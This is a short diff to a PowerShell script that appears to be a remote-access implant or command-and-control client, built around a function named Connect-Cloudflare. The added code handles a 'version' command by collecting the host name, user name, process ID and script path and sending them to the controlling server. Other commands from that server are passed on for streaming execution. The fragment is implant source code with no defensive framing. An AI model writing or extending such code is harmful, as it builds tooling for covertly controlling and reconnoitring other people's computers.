@@ -760,6 +760,17 @@ function Connect-Cloudflare {
                     continue
                 }
 
+                if ($command -eq "version") {
+                    $info = "[*] Client Version: v$Version`n"
+                    $info += "    Host: $env:COMPUTERNAME`n"
+                    $info += "    User: $env:USERNAME`n"
+                    $info += "    PID: $PID`n"
+                    $info += "    Path: $selfPath`n"
+                    Send-Result-To-Server -Body $info
+                    Start-Sleep -Milliseconds $activeDelay
+                    continue
+                }
+
                 Invoke-CommandStreaming -Command $command
 
                 Start-Sleep -Milliseconds $activeDelay
